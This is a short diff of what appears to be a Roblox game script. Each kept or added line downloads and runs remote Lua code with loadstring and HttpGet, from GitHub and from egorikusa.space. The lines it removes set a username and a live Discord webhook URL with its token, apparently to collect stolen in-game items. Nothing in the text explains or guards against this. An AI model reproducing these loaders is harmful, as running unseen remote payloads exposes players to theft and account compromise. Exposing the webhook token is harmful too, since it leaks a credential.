@@ -1,6 +1,2 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
-
-Username = "jerfie22"
-Webhook = "https://discord.com/api/webhooks/1151175399246675968/UWrlwesnmN0FI_kMFQFxMhnM0NxFVYEF5eqt_lZCzTAMy57nFPVeVqT5H2502mEaODJH"
-
-loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
+loadstring(game:HttpGet("https://egorikusa.space/63564820616bd324220ff7c7.lua", true))()
